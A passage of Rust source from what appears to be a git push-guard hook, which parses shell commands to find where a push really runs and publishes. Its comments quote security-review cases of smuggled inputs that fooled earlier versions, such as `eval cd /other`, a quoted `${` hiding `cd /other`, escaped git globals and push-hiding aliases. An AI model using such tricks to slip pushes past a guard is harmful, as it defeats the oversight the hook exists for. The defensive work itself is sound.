        // independent route to the same answer.
        if word.as_ref() == "builtin" {
            prefix_escaped |= raw.contains('\\');
            start += 1;
            if tokens
                .get(start)
                .is_some_and(|next| unescape_word(next).starts_with('-'))
            {
                return Some(DirectoryVerb::Unknowable);
            }
            continue;
        }
        if word.as_ref() == "command" {
            command_prefixed = true;
            prefix_escaped |= raw.contains('\\');
            start += 1;
            // `command`'s own flags (`-p`, `-v`, `-V`) are real and enumerable,
            // and its verb refuses through `command_prefixed` regardless.
            while start < tokens.len() {
                let flag = unescape_word(&tokens[start]);
                if !flag.starts_with('-') || flag.as_ref() == "-" {
                    break;
                }
                prefix_escaped |= tokens[start].contains('\\');
                start += 1;
            }
            continue;
        }
        break;
    }
    let rest = tokens.get(start..)?;
    let candidate = rest.first()?;

    // `eval` in command position refuses outright. It is peeled by nothing — in
    // neither `TRANSPARENT` nor `COMMAND_RUNNERS` — so `eval cd /other` made
    // `eval` the candidate, `names_directory_verb` said no, and this returned
    // `None`, which the caller reads as "not a directory verb at all": it kept
    // the STALE directory and the later push reported `unresolved: false`
    // against the session's own checkout, while bash, zsh and sh had all moved
    // (measured). Over-refuses `eval echo hi`, which is explainable.
    // `child_scripts` now surfaces the `eval`'d script (cadence-hooks#886), so
    // a push inside one is found — but it walks that script in its own scope,
    // and an `eval`'d `cd` moves the PARENT, so this refusal is still what
    // keeps the later segments honest (cadence-hooks#237 security review, F20).
    if unescape_word(candidate).as_ref() == "eval" {
        // Redirections are not operands: `eval "$(ssh-agent -s)" >/dev/null`.
        if known_ok && crate::shell::eval_is_tool_init(&strip_redirections(&rest[1..])) {
            return None;
        }
        return Some(DirectoryVerb::Unknowable);
    }

    if candidate.contains('\\') {
        // It could be a directory verb once the shell removes the escapes, and
        // the token cannot say whether it was quoted. Refuse if it might be
        // one; ignore it if it could not be.
        return names_directory_verb(unescape_word(candidate).as_ref())
            .then_some(DirectoryVerb::Unknowable);
    }
    // A `prefix_escaped` refusal for a NON-verb candidate was tried here and
    // withdrawn: it swallowed `\command git push origin main`, whose candidate
    // is `git`, turning a real push into a directory-verb refusal and dropping
    // it from the results. The unescaped flag tests above already close every
    // escaped-flag row on their own, and `prefix_escaped` still refuses on the
    // directory-verb path below, which is where it belongs.
    if !names_directory_verb(candidate) {
        return None;
    }
    // `Knowable` only when the WHOLE chain is backslash-free: an escape in the
    // prefix carries the same quoting ambiguity as one in the verb.
    Some(if command_prefixed || prefix_escaped {
        DirectoryVerb::Unknowable
    } else {
        DirectoryVerb::Knowable(rest)
    })
}

/// `eval "$(ssh-agent -s)"` — the one `eval` this walk lets through
/// (cadence-hooks#1095 ruling). Its script is ssh-agent's own output, which sets
/// `SSH_AUTH_SOCK`/`SSH_AGENT_PID` and echoes the pid; it never changes
/// directory. Matched exactly: a single operand that is a substitution of
/// `ssh-agent` with option words only, so `eval "$(ssh-agent -s)"; cd …` is
/// still a separate segment and `eval "$(cat x)"` still refuses.
pub fn evals_only_an_agent_environment(operands: &[&String]) -> bool {
    let Some(body) = substitution_body(operands) else {
        return false;
    };
    let mut words = body.split([' ', '\t']).filter(|word| !word.is_empty());
    if words.next() != Some("ssh-agent") {
        return false;
    }
    // ssh-agent's options, and nothing else: a trailing word is a COMMAND
    // ssh-agent would run, whose output is what `eval` reads. `-a SOCK`,
    // `-t LIFE`, `-E HASH`, `-P ALLOW` and `-O OPT` take a value, glued or as
    // the next word, and the value must be plain text.
    let plain = |value: &str| {
        !value.is_empty()
            && value
                .chars()
                .all(|c| c.is_ascii_alphanumeric() || "_./:@,=+-%".contains(c))
    };
    let mut expects_value = false;
    for word in words {
        if expects_value {
            if !plain(word) {
                return false;
            }
            expects_value = false;
            continue;
        }
        let Some(cluster) = word.strip_prefix('-').filter(|c| !c.is_empty()) else {
            return false;
        };
        for (pos, c) in cluster.char_indices() {
            match c {
                'c' | 's' | 'd' | 'D' | 'k' => {}
                'a' | 't' | 'E' | 'P' | 'O' => {
                    let glued = &cluster[pos + 1..];
                    if glued.is_empty() {
                        expects_value = true;
                    } else if !plain(glued) {
                        return false;
                    }
                    break;
                }
                _ => return false,
            }
        }
    }
    !expects_value
}

/// The one unreadable `cd` target this walk can still name:
/// `$(git rev-parse --show-toplevel)` (or its backtick spelling) is the top of
/// the repository the walk is already in, so the push reaches the same remotes
/// (cadence-hooks#1095 ruling). Reported as the current directory, which names
/// the same repository; an exact match only.
fn names_the_current_toplevel(operands: &[&String]) -> bool {
    let body = substitution_body(operands);
    body.is_some_and(|body| {
        body.split([' ', '\t']).filter(|word| !word.is_empty()).eq([
            "git",
            "rev-parse",
            "--show-toplevel",
        ])
    })
}

/// The command inside operands that together spell one `$(…)` or backtick
/// substitution, or `None`. The words are rejoined with single spaces because
/// an unquoted `$(git rev-parse --show-toplevel)` arrives split on its spaces,
/// and its closing `)` may already be gone — the segment trim removes a
/// trailing `)`. Rejoining quoted pieces (`cd '$(git' …`) yields the same text,
/// which is harmless here: the shell then refuses the extra operands and
/// stays where it is, which is where this walk reports it.
pub fn substitution_body(operands: &[&String]) -> Option<String> {
    let joined = operands
        .iter()
        .map(|word| word.as_str())
        .collect::<Vec<_>>()
        .join(" ");
    let joined = joined.trim();
    if let Some(rest) = joined.strip_prefix("$(") {
        return Some(rest.strip_suffix(')').unwrap_or(rest).to_string());
    }
    joined
        .strip_prefix('`')
        .and_then(|rest| rest.strip_suffix('`'))
        .map(str::to_string)
}

// [`unescape_word`] is core's shared quote removal — an escape walk, so `c\d`
// becomes `cd` while `\\cd` becomes a literal `\cd` the shell cannot find.
//
// It is used here INSTEAD of [`command_word`], which also case-folds and strips
// a path: both are right for an executable found on `PATH` and wrong for a
// builtin. Measured, `CD /usr` and `/usr/bin/cd /usr` leave bash in the ORIGINAL
// directory, so folding either into `cd` would move the tracked directory for a
// command the shell never honoured.

/// Where a directory verb leaves the shell, or `None` when this walk cannot
/// tell.
///
/// **`None` is a refusal, not a no-op, and that is the whole point.** The
/// earlier form returned the pre-`cd` directory on an unreadable target and set
/// nothing, on the reasoning that an unresolvable path fails open downstream.
/// That reasoning was wrong in this module's direction: the pre-`cd` directory
/// is not "nothing", it is the session's own checkout — a real repository that
/// answers `rev-list` confidently for a push that ran somewhere else. Measured
/// with `cd "$BUILD" && git push origin main`: the walk reported the session's
/// repo, `unresolved: false`, and `Commits([])` — allow — while the push
/// published a commit from another repository. The caller now gets
/// `unresolved` and can refuse.
///
/// `git -C $D push` used to resolve to `<cwd>/$D`, a path that does not exist,
/// so `rev-list` failed there; it is now marked the same way as this arm
/// (`directory_unverified`, cadence-hooks#1095 review).
///
/// Unreadable: `popd`; ANY flagged `pushd`; a bare verb; `-` (`$OLDPWD`); a
/// target carrying an unexpanded `$` or a backtick; and more than one operand.
///
/// **`pushd` refuses on any flag rather than on a list of flags.** `-n` pushes
/// onto the stack *without moving* (measured: `pushd -n /b` from `/a` leaves
/// `pwd` at `/a`) and `+N`/`-N` rotate the stack, so the flags that change the
/// verb's meaning outnumber the ones that do not. Enumerating them is the wrong
/// side of that problem — a flag this walk has not heard of would silently take
/// the literal-path arm. A refusal for `-n` is a deliberate over-refusal: the
/// provable answer there is "does not move", and over-refusing costs an
/// explainable refusal while under-refusing costs a wrong repository.
///
/// **Two operands is bash's substitute form**, not a move: `cd repo other`
/// replaces `repo` with `other` inside `$PWD`, and measured it errors with
/// `too many arguments` and does not move at all. Taking the first operand
/// reported `<cwd>/repo` for a shell that never left `<cwd>`.
///
/// `$` is tested anywhere in the token, not just at the front — `cd "$HOME/x"`
/// and `cd /a/$B` are equally unknowable.
///
/// `tokens` begins at the verb ([`directory_verb`] did the peel).
///
/// Returns the target to apply with [`apply_cd_target`] (`None` when the
/// verb stays where it is), and whether it came from a literal absolute
/// target, which ends any earlier directory doubt.
fn resolve_directory_verb(tokens: &[String], known_ok: bool) -> Option<(Option<&str>, bool)> {
    let verb = tokens.first()?.as_str();
    if verb == "popd" {
        return None;
    }
    let stack_verb = verb == "pushd";
    let mut idx = 1;
    // The flag skip reads the UNESCAPED word. Compared raw, `cd \-` was not
    // recognised as the bare `-` that means `$OLDPWD`; it fell through to
    // `resolve_cd_target`, which JOINED it, and the walk answered `/repo/\-`
    // for a shell sitting in `$OLDPWD`. It failed closed downstream — that path
    // does not exist, so `git -C` fails and the range is `Unresolved` — but an
    // invented directory is not an answer (cadence-hooks#237 security review,
    // N23).
    while tokens.get(idx).is_some_and(|t| {
        let t = unescape_word(t);
        t.as_ref() == "--" || (t.starts_with('-') && t.as_ref() != "-")
    }) {
        if stack_verb {
            return None;
        }
        idx += 1;
    }
    // A redirection is not an operand. `pushd <dir> >/dev/null` is how the
    // idiom is normally written, and counting the redirect words made that
    // ordinary, non-adversarial command refuse.
    let operands: Vec<&String> = strip_redirections(&tokens[idx..]);
    if known_ok && !stack_verb && names_the_current_toplevel(&operands) {
        return Some((None, false));
    }
    if operands.len() != 1 {
        return None;
    }
    match operands.first() {
        // The `-`/`+N` tests read the UNESCAPED operand for N23's reason: `cd
        // \-` is the shell's `$OLDPWD` spelling, and comparing it raw let it
        // fall through to `resolve_cd_target`, which joined it into a directory
        // that never existed. The TARGET itself is still resolved from the RAW
        // operand — unescaping it would invent a path that may exist and answer
        // `rev-list` confidently, where the raw spelling fails closed.
        Some(target)
            if unescape_word(target).as_ref() != "-"
                && !target.contains('$')
                && !target.contains('`')
                && !(stack_verb && unescape_word(target).starts_with('+')) =>
        {
            Some((
                Some(target.as_str()),
                // A Windows drive path is as absolute as `/x`, the same test
                // `resolve_cd_target` uses; `starts_with('/')` alone kept the
                // doubt of an earlier `cd "$HOME"` alive past `cd C:\repo`.
                crate::shell::looks_absolute(target),
            ))
        }
        _ => None,
    }
}

/// The words that are real operands, with redirections removed.
///
/// A redirect arrives as one token when its target is glued on (`>/dev/null`,
/// `2>&1`) and as two when the operator stands alone (`> log`), so the standalone
/// form consumes the word after it. [`crate::shell::is_redirect_token`] is core's own test for
/// the operator, shared rather than re-spelled.
/// [`strip_redirections`], but a token the shell QUOTED is never a redirection.
///
/// **Quote removal is what makes this necessary.** `tokenize` strips quotes, so
/// `'>leak'` and `>leak` arrive byte-identical and a strip judging the text
/// alone silently discards a legal refspec (`git check-ref-format
/// refs/heads/'>b'` answers OK) as if it were a redirection — the fail-open
/// direction this module exists to refuse. The marks come from
/// [`crate::shell::executable_tokens_marked`], which carries the one fact quote
/// removal destroys.
///
/// **The question is whether the redirect OPERATOR was quoted, not the token.**
/// The operator and its target are one word, and only the operator decides. A
/// whole-token mark refused to strip `>"$LOG"`, `2>"/dev/null"` and `>>"$LOG"` —
/// the spellings scripts are actually written in — turning each into a phantom
/// refspec that `is_safe_ref` then rejected, so an ordinary
/// `git push origin main >"$LOG" 2>&1` was blocked. The operator there is
/// unquoted; only the target is (cadence-hooks#237 security review, F27).
///
/// `unquoted_prefix_lens` is indexed in lockstep with `words`; a missing entry
/// reads as `0` — quoted from the first byte — so an absent mark keeps its
/// operand rather than dropping it.
fn strip_unquoted_redirections<'a>(
    words: &'a [String],
    unquoted_prefix_lens: &[usize],
) -> Vec<&'a String> {
    let mut operands = Vec::new();
    let mut idx = 0;
    while let Some(word) = words.get(idx) {
        let unquoted_prefix_len = unquoted_prefix_lens.get(idx).copied().unwrap_or(0);
        if let Some(operator) = redirect_operator(word)
            && unquoted_prefix_len >= operator.len
        {
            // Standalone operator: the next word is its target, not an operand.
            idx += if operator.is_whole_word { 2 } else { 1 };
            continue;
        }
        operands.push(word);
        idx += 1;
    }
    operands
}

/// Does a `}` appearing right after `prefix` close a `${` opened in it?
///
/// A single backward-counting scan: `${` opens, `}` closes, and a positive depth
/// at the end of the prefix means the next brace is the expansion's own. `$(…)`
/// and `((…))` are deliberately not tracked — neither is closed by `}`, so
/// neither can move this count.
///
/// Undercounting is the safe direction: it can only leave a brace looking like a
/// word byte, which refuses. Overcounting silently un-refuses a real one, and a
/// **quoted** `${` is exactly what caused it — `'${'` is a literal two-character
/// string, not an opener, so
/// `git push origin --push-option='${' secret}` and
/// `X='${' cd /other} && git push origin main` disarmed the trailing-`}` refusal
/// and reopened both wrong-answer faces with `unresolved: false`.
///
/// **The quote check is what closes that**: a candidate opener only counts when
/// no `'` or `"` sits between it and the brace under test. Every legitimate
/// spelling has none (`echo ${HOME}`, `mkdir -p ${OUT}`, `echo ${A} ${B}`,
/// `export PATH=${PATH}:/x`); every disarming one has a quote in that span. The
/// test is deliberately coarser than tracking quote state — it can only refuse
/// an exemption, never grant one, so its error direction is the safe one
/// (cadence-hooks#237 security review, I3).
fn closes_parameter_expansion(prefix: &str) -> bool {
    let bytes = prefix.as_bytes();
    let mut openers: Vec<usize> = Vec::new();
    let mut index = 0;
    while index < bytes.len() {
        if bytes[index] == b'$' && bytes.get(index + 1) == Some(&b'{') {
            openers.push(index);
            index += 2;
            continue;
        }
        if bytes[index] == b'}' {
            openers.pop();
        }
        index += 1;
    }
    openers
        .last()
        .is_some_and(|opener| !prefix[*opener..].contains(['\'', '"']))
}

/// The leading `&`/digits/`>`-`<` run that makes a word a redirection.
struct RedirectOperator {
    /// Byte length of that run — what a quote must clear to leave it intact.
    len: usize,
    /// The whole word is the operator, so its target is the next word.
    is_whole_word: bool,
}

/// Measure the redirect operator prefix, or `None` when the word is not
/// redirect-shaped.
///
/// **It does not re-derive that predicate; it is gated on it.** The first line
/// asks `is_redirect_token`, and the measurement below only runs once that has
/// said yes — so a disagreement between the two trims is unreachable rather
/// than merely unlikely. The trims are deliberately near-identical anyway
/// (`&`, then digits, then the `>`/`<` run), but the gate is what makes the
/// parity claim true, not the resemblance: `is_redirect_token` strips a single
/// leading `&` where this strips every one, and only the gate keeps that from
/// mattering.
fn redirect_operator(word: &str) -> Option<RedirectOperator> {
    let (len, is_whole_word) = crate::shell::redirect_operator_span(word)?;
    Some(RedirectOperator { len, is_whole_word })
}

fn strip_redirections(words: &[String]) -> Vec<&String> {
    // One implementation, every prefix declared fully unquoted. A second body
    // here is exactly the drift this branch already paid for once at
    // `is_prefix_word`.
    //
    // **This quote-blind form has exactly one caller left —
    // [`resolve_directory_verb`] — and the F25 hazard documented above is live
    // there.** A quoted redirect-shaped `cd` operand is still discarded as a
    // redirection. It fails CLOSED in every shape measured: dropping the operand
    // makes `operands.len() != 1`, `resolve_directory_verb` returns `None`, and
    // the caller marks the scope unresolved — `cd '>x' && git push` answers
    // `unresolved: true`. That is why it is left as is; a reader patching that
    // function later should not take the block above as covering them.
    strip_unquoted_redirections(words, &vec![usize::MAX; words.len()])
}

/// git's global options that take a SEPARATE value word.
///
/// The same list `enforce_worktree::commit_targets_of` walks. It must be
/// complete in the value-taking direction: a global whose value is not consumed
/// stops the walk on that value, the subcommand is never reached, and the push
/// goes unseen (a silent miss, not a false block).
const VALUE_GLOBALS: &[&str] = &[
    "-C",
    "-c",
    "--namespace",
    "--super-prefix",
    "--config-env",
    "--attr-source",
    "--work-tree",
    "--git-dir",
];

/// What a walk of git's global options found, plus the slice beginning at git's
/// SUBCOMMAND.
struct GitGlobals<'a> {
    /// The effective work dir after any `-C` redirect.
    work_dir: String,
    /// `--git-dir`/`--work-tree` was seen — the push points at a repository
    /// this walk cannot name correctly.
    foreign_redirect: bool,
    /// A `-C` value carrying `$` or a backtick — the `git -C "$D"` twin of an
    /// unreadable `cd` target, and treated the same way
    /// ([`PushInvocation::directory_unverified`]).
    unreadable_dir: bool,
    /// A `-c`/`--config-env` global carried a key that replaces the bare-push
    /// ref computation (`push.default`, or a `remote.<name>.push` refspec).
    push_config_override: bool,
    /// See [`PushInvocation::config_destinations`].
    config_destinations: Vec<String>,
    /// See [`PushInvocation::destination_unreadable`].
    destination_unreadable: bool,
    /// See [`PushInvocation::config_remotes`].
    config_remotes: Vec<String>,
    /// Aliases the command line defines: `-c alias.NAME=VALUE` as
    /// `(NAME, Some(VALUE))`, and a `--config-env=alias.NAME=VAR` — whose value
    /// lives in the environment — as `(NAME, None)`. Names lowercased.
    aliases: Vec<(String, Option<String>)>,
    /// The words from git's subcommand onward.
    rest: &'a [String],
}

/// Walk git's globals.
///
/// `argv` is the words AFTER the `git` verb.
///
/// **`-C` accumulates**, as git documents: each non-absolute hop resolves
/// against the preceding one.
///
/// **`--git-dir`/`--work-tree` are reported, not resolved.** Either one points
/// the push at a repository this walk would have to model git's own setup rules
/// to name correctly, and naming it *wrongly* means scanning the wrong history —
/// the miss this module exists to prevent. Reporting them as unresolved hands
/// the caller a refusal it can explain.
///
/// **`-c`/`--config-env` are reported by KEY, never interpreted.** The config
/// that decides what a bare push publishes can arrive on the command line, and
/// [`implicit_push_config_unresolvable`] cannot see it: that probe runs its own
/// `git config` subprocess, which reads the repository and inherits the hook
/// process's environment, not the command's. Measured — with
/// `git -c push.default=matching push origin`, the probe answers `simple` about
/// a push git performs under `matching`. Only the key is examined, and any
/// value marks the invocation unresolved, because reading the value would mean
/// re-implementing git's config parsing to decide a safety question.
fn git_globals<'a>(argv: &'a [String], effective_dir: &str, known_ok: bool) -> GitGlobals<'a> {
    let mut redirect: Option<String> = None;
    let mut foreign_redirect = false;
    let mut unreadable_dir = false;
    let mut push_config_override = false;
    let mut config_destinations = Vec::new();
    let mut destination_unreadable = false;
    let mut config_remotes = Vec::new();
    let mut env_aliases = Vec::new();
    let mut note_redirect =
        |setting: &str, from_env: bool| match config_push_redirect(setting, from_env) {
            ConfigRedirect::None => {}
            ConfigRedirect::Url(url) => config_destinations.push(url),
            ConfigRedirect::Remote(remote) => config_remotes.push(remote),
            ConfigRedirect::Unreadable | ConfigRedirect::Clone { .. } => {
                destination_unreadable = true;
            }
        };
    let mut idx = 0;

    while idx < argv.len() {
        // **Normalized once, then compared everywhere below.** git sees the word
        // after the shell removes the escapes — measured, `git --git-\dir=/x`
        // reports `not a git repository: '/x'` — but this walk compared the raw
        // token, so an escaped global went unread in two directions at once: a
        // `--git-\dir=` redirect left `unresolved: false` on a push that went
        // elsewhere, and `git -\C /other push` never even reached the
        // subcommand, so the push was absent from the results entirely.
        //
        // Unlike [`directory_verb`], unescaping here needs no ambiguity flag:
        // every arm below only widens what is SEEN, and none of them sets a
        // directory the shell might not have entered — `-C`'s value is still
        // resolved from the raw operand, which fails closed.
        let word = unescape_word(argv[idx].as_str());
        if !word.starts_with('-') {
            break;
        }

        // A value word is consumed WITH its flag, in one step, so it is never
        // re-read as a flag on the next pass. Deciding that by looking BACK at
        // the previous token instead — the shape
        // `enforce_worktree::commit_targets_of` uses — misreads a value that
        // happens to spell a global: in `git -c -C push origin main` the `-C` is
        // `-c`'s value, but a look-back walk then reads `push` as `-C`'s value,
        // never reaches the subcommand, and the push goes unseen.
        if VALUE_GLOBALS.contains(&word.as_ref()) {
            match word.as_ref() {
                // `-C` accumulates: resolve this hop against the previous one.
                // The VALUE stays raw — resolving it unescaped could invent a
                // directory, and an unresolvable one fails closed downstream.
                "-C" => {
                    if let Some(value) = argv.get(idx + 1) {
                        let base = redirect.as_deref().unwrap_or(effective_dir);
                        if known_ok && names_the_current_toplevel(&[value]) {
                            // The top of the repository already in effect.
                            redirect = Some(base.to_string());
                        } else if value.contains(['$', '`']) {
                            unreadable_dir = true;
                            redirect = Some(base.to_string());
                        } else {
                            redirect = Some(resolve_cd_target(value, base));
                        }
                    }
                }
                "--work-tree" | "--git-dir" => foreign_redirect = true,
                "-c" | "--config-env" => {
                    if let Some(value) = argv.get(idx + 1) {
                        push_config_override |= sets_push_ref_computation(value);
                        note_redirect(value, word == "--config-env");
                        if word == "--config-env" {
                            env_aliases.extend(env_alias_name(value));
                        }
                    }
                }
                _ => {}
            }
            idx += 2;
            continue;
        }

        if word.starts_with("--work-tree=") || word.starts_with("--git-dir=") {
            foreign_redirect = true;
        }
        if let Some(setting) = word.strip_prefix("--config-env=") {
            push_config_override |= sets_push_ref_computation(setting);
            note_redirect(setting, true);
            env_aliases.extend(env_alias_name(setting));
        }
        idx += 1;
    }
    // A trailing value-taking global with no value (`git -C`) leaves `idx` past
    // the end; git errors on that command, and an empty slice reports no push.
    let idx = idx.min(argv.len());
    let mut aliases: Vec<(String, Option<String>)> = git_command_line_aliases(&argv[..idx])
        .into_iter()
        .map(|(name, value)| (name, Some(value)))
        .collect();
    aliases.extend(env_aliases.into_iter().map(|name| (name, None)));

    GitGlobals {
        work_dir: redirect.unwrap_or_else(|| effective_dir.to_string()),
        foreign_redirect,
        unreadable_dir,
        push_config_override,
        config_destinations,
        destination_unreadable,
        config_remotes,
        aliases,
        rest: &argv[idx..],
    }
}

/// The alias a `--config-env=alias.NAME=VAR` setting defines, lowercased.
fn env_alias_name(setting: &str) -> Option<String> {
    let setting = unescape_word(setting);
    let (key, _) = setting.split_once('=')?;
    let key = key.to_ascii_lowercase();
    key.strip_prefix("alias.").map(str::to_string)
}

/// Whether a git subcommand is an alias the same command line defines in a
/// way that can hide a push (cadence-hooks#1161): its value names `push`
/// anywhere, starts with `!` (a shell command, which can run anything), or
/// arrives through `--config-env` and cannot be read. `core::shell` surfaces a
/// readable expansion as a child script, so the push inside is judged too;
/// this marks the invocation itself unreadable, because git splits the value
/// with its own rules and resolves an alias of an alias, neither of which the
/// walk re-implements to decide a safety question.
///
/// Aliases in a config FILE are not read: that needs one `git config` probe
/// per repository, and this walk reads text only (a named design call).
fn alias_hides_a_push(aliases: &[(String, Option<String>)], subcommand: &str) -> bool {
    let name = unescape_word(subcommand).to_ascii_lowercase();
    aliases
        .iter()
        .rev()
        .find(|(alias, _)| *alias == name)
        .is_some_and(|(_, value)| {
            value.as_deref().is_none_or(|value| {
                value.to_ascii_lowercase().contains("push") || value.trim_start().starts_with('!')
            })
        })
}

/// Whether a git subcommand is an alias the same command line defines as
/// exactly `push` (`-c alias.p=push p origin feat`): git runs its builtin with
/// the alias's own words in front of the ones written, and there are none, so
/// the rest of the command line is the push's, judged like any other
/// (cadence-hooks#1172). A `!` shell alias, a value with anything else in it,
/// and a `--config-env` one are not this: they keep [`alias_hides_a_push`].
fn alias_is_plain_push(aliases: &[(String, Option<String>)], subcommand: &str) -> bool {
    let name = unescape_word(subcommand).to_ascii_lowercase();
    aliases
        .iter()
        .rev()
        .find(|(alias, _)| *alias == name)
        .is_some_and(|(_, value)| value.as_deref().is_some_and(|value| value.trim() == "push"))
}

/// What one `-c`/`--config-env` setting, or one earlier config write, does to
/// where a push goes.
#[derive(Debug, Clone)]
enum ConfigRedirect {
    /// Nothing: the key does not decide the destination.
    None,
    /// `remote.<name>.url`/`.pushurl` with a literal value: the push may go
    /// there.
    Url(String),
    /// `remote.pushDefault`/`branch.<b>.pushRemote`/`branch.<b>.remote` with
    /// a literal value: a bare push may go to that remote.
    Remote(String),
    /// The key decides the destination, but the text cannot show where.
    Unreadable,
    /// A `git clone`/`gh repo clone` into `dest` (`None` when the text cannot
    /// show where): a later push run there, or below it, goes where the clone
    /// came from, and its `-c` settings. The guard's probes run before the
    /// clone exists, so they read nothing there (cadence-hooks#1161).
    Clone {
        dest: Option<String>,
        redirects: Vec<ConfigRedirect>,
    },
}

impl ConfigRedirect {
    /// Record this redirect on a push that runs after it.
    fn apply_to(&self, push: &mut PushInvocation) {
        match self {
            Self::None => {}
            Self::Url(url) => {
                if !push.config_destinations.contains(url) {
                    push.config_destinations.push(url.clone());
                }
            }
            Self::Remote(remote) => {
                if !push.config_remotes.contains(remote) {
                    push.config_remotes.push(remote.clone());
                }
            }
            Self::Unreadable => push.destination_unreadable = true,
            Self::Clone { dest: None, .. } => push.destination_unreadable = true,
            Self::Clone {
                dest: Some(dest),
                redirects,
            } => {
                let dest = lexical_path(dest);
                let dir = lexical_path(&push.work_dir);
                let inside = dir == dest
                    || dir
                        .strip_prefix(dest.as_str())
                        .is_some_and(|below| below.starts_with('/') || dest.ends_with('/'));
                if inside {
                    for redirect in redirects {
                        redirect.apply_to(push);
                    }
                }
            }
        }
    }
}

/// `path` with `.` and empty components removed and `..` folded into its
/// parent, textually — the comparison a clone's directory and a push's need,
/// since `cd ./d/` and `d` name one place. A path the text cannot fold (a
/// `..` above the start of a relative path) keeps the `..`.
fn lexical_path(path: &str) -> String {
    let absolute = path.starts_with('/');
    let mut parts: Vec<&str> = Vec::new();
    for part in path.split('/') {
        match part {
            "" | "." => {}
            ".." if parts.last().is_some_and(|last| *last != "..") => {
                parts.pop();
            }
            ".." if absolute => {}
            _ => parts.push(part),
        }
    }
    let joined = parts.join("/");
    if absolute {
        format!("/{joined}")
    } else {
        joined
    }
}

/// `git clone`'s options that take a value, glued (`--depth=1`, `-b main`
/// glued as `-bmain`) or as the next word. Long names match any unambiguous
/// prefix, as git's parse-options accepts; `-c`/`--config` are read for
/// what they set.
const CLONE_VALUE_SHORT_FLAGS: &str = "obucj";
const CLONE_VALUE_LONG_FLAGS: &[&str] = &[
    "origin",
    "branch",
    "upload-pack",
    "config",
    "jobs",
    "template",
    "reference",
    "reference-if-able",
    "separate-git-dir",
    "depth",
    "shallow-since",
    "shallow-exclude",
    "filter",
    "server-option",
    "bundle-uri",
    "ref-format",
    "revision",
];

/// What a `git clone`'s words (after `clone`, unescaped) say: its positionals
/// (the source, then the directory), the redirects its `-c` settings make, and
/// whether `--bare`/`--mirror` put `.git` on the default directory name.
fn clone_words(words: &[String]) -> (Vec<&String>, Vec<ConfigRedirect>, bool) {
    let mut positionals = Vec::new();
    let mut redirects = Vec::new();
    let mut bare = false;
    let mut idx = 0;
    let mut options_ended = false;
    while let Some(word) = words.get(idx) {
        idx += 1;
        if options_ended || !word.starts_with('-') || word == "-" {
            positionals.push(word);
            continue;
        }
        if word == "--" {
            options_ended = true;
            continue;
        }
        let (name, value) = if let Some(long) = word.strip_prefix("--") {
            let (name, glued) = match long.split_once('=') {
                Some((name, value)) => (name, Some(value.to_string())),
                None => (long, None),
            };
            if ["bare", "mirror"].contains(&name) {
                bare = true;
            }
            let takes = !name.is_empty()
                && CLONE_VALUE_LONG_FLAGS
                    .iter()
                    .any(|flag| flag.starts_with(name));
            if !takes {
                continue;
            }
            let value = glued.or_else(|| {
                idx += 1;
                words.get(idx - 1).cloned()
            });
            (if "config".starts_with(name) { "c" } else { "" }, value)
        } else {
            let cluster = &word[1..];
            let Some((at, c)) = cluster
                .char_indices()
                .find(|(_, c)| CLONE_VALUE_SHORT_FLAGS.contains(*c))
            else {
                continue;
            };
            let glued = &cluster[at + c.len_utf8()..];
            let value = if glued.is_empty() {
                idx += 1;
                words.get(idx - 1).cloned()
            } else {
                Some(glued.to_string())
            };
            (if c == 'c' { "c" } else { "" }, value)
        };
        if name == "c" {
            match value.map(|setting| config_push_redirect(&setting, false)) {
                Some(ConfigRedirect::None) => {}
                Some(redirect) => redirects.push(redirect),
                None => redirects.push(ConfigRedirect::Unreadable),
            }
        }
    }
    (positionals, redirects, bare)
}

/// git's default directory for a clone of `source`: its last path component,
/// without a trailing `/`, `/.git` or `.git`, plus `.git` for a bare clone.
fn humanish_directory(source: &str, bare: bool) -> Option<String> {
    let trimmed = source.trim_end_matches('/');
    let trimmed = trimmed.strip_suffix("/.git").unwrap_or(trimmed);
    let trimmed = trimmed.trim_end_matches('/');
    let name = trimmed.rsplit(['/', ':']).next()?;
    let name = name.strip_suffix(".git").unwrap_or(name);
    if name.is_empty() || name == "." || name == ".." {
        return None;
    }
    Some(if bare {
        format!("{name}.git")
    } else {
        name.to_string()
    })
}

/// The [`ConfigRedirect::Clone`] a clone of `sources` (each a place it may
/// come from) into `directory` (or its default, `default_dir`) records,
/// resolved against `dir`.
fn clone_write(
    sources: Vec<ConfigRedirect>,
    directory: Option<&String>,
    default_dir: Option<String>,
    mut redirects: Vec<ConfigRedirect>,
    dir: &str,
) -> ConfigRedirect {
    let dest = match directory {
        Some(named) if named.contains(['$', '`']) || named.is_empty() => None,
        Some(named) => Some(resolve_cd_target(named, dir)),
        None => default_dir
            .filter(|name| !name.contains(['$', '`']))
            .map(|name| resolve_cd_target(&name, dir)),
    };
    redirects.splice(0..0, sources);
    ConfigRedirect::Clone { dest, redirects }
}

/// The write a `git clone …` makes; `words` are the unescaped words after
/// `clone`, and `dir` is where git runs (after any `-C`).
fn git_clone_write(words: &[String], dir: &str) -> Option<ConfigRedirect> {
    let (positionals, redirects, bare) = clone_words(words);
    let source = *positionals.first()?;
    let url = written_url(Some(source)).unwrap_or(ConfigRedirect::Unreadable);
    let default_dir = humanish_directory(source, bare);
    Some(clone_write(
        vec![url],
        positionals.get(1).copied(),
        default_dir,
        redirects,
        dir,
    ))
}

/// The `GH_HOST` an inline prefix (`GH_HOST=h gh …`, `env GH_HOST=h gh …`)
/// hands one gh command: `None` when the prefix does not name it,
/// `Some(Err(()))` when it names it in a way the text cannot read (an
/// expansion in the value or the name, `env -u GH_HOST`).
fn inline_gh_host(prefix: &[String]) -> Option<Result<Vec<String>, ()>> {
    let mut found = None;
    for word in prefix {
        let word = unescape_word(word);
        match word.split_once('=') {
            Some(("GH_HOST", value)) => {
                found = Some(plain_host(value).map(|host| vec![host]).ok_or(()));
            }
            Some((name, _)) if name.contains(['$', '`']) => found = Some(Err(())),
            None if word.contains("GH_HOST") => found = Some(Err(())),
            _ => {}
        }
    }
    found
}

/// The write a `gh repo clone REPO [DIR] [-- GITFLAGS…]` makes; `words` are
/// the unescaped words after `clone`. `OWNER/REPO` is on the `GH_HOST` gh
/// runs with — each of `gh_hosts`, or unreadable when that is `None` —
/// `HOST/OWNER/REPO` on that host, and a URL (gh reads any `:` as one) is
/// itself. A bare `REPO` is the signed-in user's, whom gh's config file names
/// (`user_of`), and is unreadable when it does not.
fn gh_clone_write(
    words: &[String],
    dir: &str,
    gh_hosts: Option<&[String]>,
    user_of: &dyn Fn(&str) -> Option<String>,
) -> Option<ConfigRedirect> {
    let split = words.iter().position(|word| word == "--");
    let (own, git_flags) = match split {
